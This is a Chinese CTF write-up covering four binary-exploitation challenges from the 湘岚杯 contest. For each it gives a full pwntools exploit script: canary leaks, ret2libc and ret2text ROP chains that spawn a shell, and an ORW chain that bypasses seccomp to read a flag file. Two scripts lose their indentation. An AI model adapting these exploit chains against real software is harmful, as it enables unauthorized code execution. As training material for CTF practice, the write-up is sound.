---
title: 湘岚杯
date: 2025-01-22 09:47:54
tags:
categories:
- PWN
---
CrazyCat-pwn
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020250121140940.png)
~~做了两题就去春秋杯了，结果春秋杯爆零，还不如把这个做完QAQ。~~
# ezlibc
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020250121141259.png)
一道简单的`ret2libc`的题目，开启`canary`，得先想办法泄漏`canary`。
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020250121141418.png)
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020250121141711.png)
虽然有`printf`函数，但不能直接泄漏地址，但`printf`会一直输出直到`\x00`，那么把`canary`前填充满`deadbeef`就能泄漏`canary`。
泄漏`canary`后在构造ROP泄漏地址，获取`libc`基址并重新调用`read`函数进行第三次溢出来获取`shell`。
exp:
```python
from pwn import *
# from LibcSearcher import LibcSearcher
from wstube import websocket

context.log_level = 'debug'
local = True
if local:
    p = process('./ezlibc')
    pwnlib.gdb.attach(p, 'b bug')
else:
    p = websocket('wss://xlctf.huhstsec.top/api/proxy/019471c6-5bcb-772c-b85c-78d6ad4f3ed1')

elf = ELF('./ezlibc')

payload = b'a' * (0x29)
p.send(payload)
p.recvuntil(b'a' * 0x29)
canary = u64(b'\x00' + p.recv(7))
log.success('canary: ' + hex(canary))

rdi = 0x400843
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
bug = 0x4006e7
payload = b'a' * (0x28) + p64(canary) + b'a' * 8 + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(bug)
p.recvuntil(b'closer to the key')
p.send(payload)

p.recvuntil(b'keep trying\n')
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))

'''libc = LibcSearcher('puts', puts_addr)
base = puts_addr - libc.dump('puts')
system = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')'''

ret = 0x40059e
log.success('puts_addr: ' + hex(puts_addr))
base = puts_addr - 0x80970
system = base + 0x4f420
binsh = base + 0x1b3d88

payload = b'a' * (0x28) + p64(canary) + b'a' * 8 + p64(ret) + p64(rdi) + p64(binsh) + p64(system)
p.send(payload)
p.sendafter(b'closer to the key', b'a')

p.interactive()
```
shell:
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020250121160630.png)
# ret2text
简单的`ret2text`类型题目
找到溢出点，`backdoors`，构造`payload`即可。
exp:
```python
from pwn import *
# from LibcSearcher import LibcSearcher
from wstube import websocket

context.log_level = 'debug'
local = False
if local:
    p = process('./1')
    pwnlib.gdb.attach(p, 'b main')
else:
    p = websocket('wss://xlctf.huhstsec.top/api/proxy/019471ee-7eac-765f-ae48-e2b9fb68618e')

backdoor = 0x40115a
payload = b'a' * (0xa + 8) + p64(backdoor)
p.send(payload)
p.interactive()
```
shell:
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020250121161101.png)

# sandbox
一道简单的`orw`类型题目。
`seccomp`后可以看到只禁用了`execve`。
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020250121161542.png)
可以构造最普通的`orw`。
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020250121161640.png)
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020250121161654.png)
可以看见开启了`canary`，有栈溢出和格式化字符串漏洞，那么先用格式化字符串漏洞泄漏`canary`和`libc`的基址，然后构造`ROP`类型的`orw`即可泄漏`./flag`的数据。
exp:
```python
from pwn import *
# from LibcSearcher import LibcSearcher
from wstube import websocket

context.log_level = 'debug'
local = True
if local:
p = process('./attachment')
pwnlib.gdb.attach(p, 'b func')
else:
# p = websocket('wss://xlctf.huhstsec.top/api/proxy/019471ee-7eac-765f-ae48-e2b9fb68618e')
p = remote('xlctf.huhstsec.top', 45537)

elf = ELF('./attachment')
libc = ELF('./libc.so.6')
log.success('__libc_start_main: ' + hex(libc.symbols['__libc_start_main']))
log.success('read: ' + hex(libc.symbols['read']))
log.success('open: ' + hex(libc.symbols['open']))
log.success('write: ' + hex(libc.symbols['write']))
# libc = ELF('./libc6_2.35-0ubuntu3_amd64.so')

# payload1 = '%13$p-%19$p'
payload1 = '%13$p-%39$p'

p.recvuntil(b'Do you know orw?')
p.sendline(payload1)
p.recvuntil(b'\n')
p.recvuntil(b'0x')
canary = int(p.recvuntil('-', drop=True), 16)
p.recvuntil(b'0x')
# base = int(p.recvuntil(b'\n'), 16) - libc.symbols['__libc_start_main'] - 120
main_addr = int(p.recv(12), 16) - 128
base = main_addr - libc.symbols['__libc_start_main']
log.success('main:' + hex(main_addr))
log.success('canary: ' + hex(canary))
log.success('base: ' + hex(base))

bss = elf.bss() + 0x100
rdi = 0x4014c3
rsi_r15 = 0x4014c1
ret = 0x40101a
rdx_rbx = base + 0x90529

read_addr = base + libc.symbols['read']
open_addr = base + libc.symbols['open']
write_addr = base + libc.symbols['write']

payload2 = b'a' * (0x38) + p64(canary)

payload2 += p64(ret) + p64(rsi_r15) + p64(bss) + p64(0)
payload2 += p64(read_addr)

payload2 += p64(rdi) + p64(bss)
payload2 += p64(rsi_r15) + p64(0) + p64(0)
payload2 += p64(rdx_rbx) + p64(0) + p64(0)
payload2 += p64(open_addr)

payload2 += p64(rdi) + p64(3)
payload2 += p64(rsi_r15) + p64(bss) + p64(0)
payload2 += p64(rdx_rbx) + p64(0x100) + p64(0)
payload2 += p64(read_addr)

payload2 += p64(rdi) + p64(1)
payload2 += p64(rsi_r15) + p64(bss) + p64(0)
payload2 += p64(rdx_rbx) + p64(0x100) + p64(1)
payload2 += p64(write_addr)

p.recvuntil(b'can you did it?')
p.send(payload2)
pause()
p.send(b'./flag\x00')

p.interactive()
```
flag:
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020250121163812.png)

# 宇宙射线
程序里给了`/proc/self/mem`，可以直接修改代码。
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020250121165930.png)
首先按照0x的格式输入要修改的地址。
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020250121170028.png)
然后在此处输入一个字节，便可以修改为输入的字节。
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020250121170126.png)
例如这里我们选择的是0x40151f，并将此处修改为0x00。
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020250121170219.png)
可以看到修改成功。
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020250121170606.png)
在这里可以看到用syscall调用了系统调用号为3c的程序，将3c修改就可以调用其他程序。将其修改为0就可以调用read函数。
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020250121170908.png)
可以看到成功调用了read函数，且拥有栈溢出漏洞。
ROPgadget查询后发现只有pop rbp可用，但程序中有一个key函数可以将rbp的内容放入rdi中。
之后便是简单的ret2libc。
exp：
```python
from pwn import *
# from LibcSearcher import LibcSearcher
from wstube import websocket

context.log_level = 'debug'
local = False
if local:
p = process('./pwn')
pwnlib.gdb.attach(p, 'b *.x40155f')
else:
# p = websocket('wss://xlctf.huhstsec.top/api/proxy/019471ee-7eac-765f-ae48-e2b9fb68618e')
p = remote('101.43.67.25', 8090)

elf = ELF('./pwn')
libc = ELF('./libc.so.6')

p.sendlineafter(b'cosmic rays:\n', b'0x401562')
p.sendlineafter(b'Enter the data sent:\n', b'0x0')

payload = b'a' * (0x12)
  
ret = 0x40101a
rbp = 0x40127d
key = 0x40129e
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
read_addr = 0x401553
main = 0x401309

payload += p64(ret) + p64(rbp) + p64(puts_got) + p64(key) + p64(ret) + p64(puts_plt)
payload += p64(main)
  
p.send(payload)
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
print('puts_addr:', hex(puts_addr))
  
base = puts_addr - libc.sym['puts']
system_addr = base + libc.sym['system']
bin_sh = base + next(libc.search(b'/bin/sh'))

p.sendlineafter(b'cosmic rays:\n', b'0x401562')
p.sendlineafter(b'Enter the data sent:\n', b'0x0')

payload = b'a' * (0x12 + 0x8)
payload += p64(ret) + p64(rbp) + p64(bin_sh) + p64(key) + p64(ret) + p64(system_addr)

p.send(payload)

p.interactive()
```
shell:
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020250122094222.png)
